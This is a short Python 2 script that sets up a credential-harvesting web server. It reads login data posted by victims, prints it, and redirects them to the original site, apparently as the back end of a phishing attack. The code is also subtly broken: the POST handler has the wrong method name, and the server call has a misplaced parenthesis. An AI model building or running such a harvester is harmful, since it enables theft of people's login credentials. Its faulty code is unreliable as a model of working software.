import SimpleHTTPServer
import SocketServer
import urllib
import sys

class CredentialHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def execute_Post(self):
        content_length = int(self.headers['Content-Length'])
        creds = self.rfile.read(content_length).decode('utf-8')
        print creds
        site = self.path[1:]
        self.send_response(301)
        self.send_header('Location', urllib.unquote(site))
        self.end_headers()

server = SocketServer.TCPServer((sys.argv[1], int(sys.argv[2], CredentialHandler)
server.serve_forever()
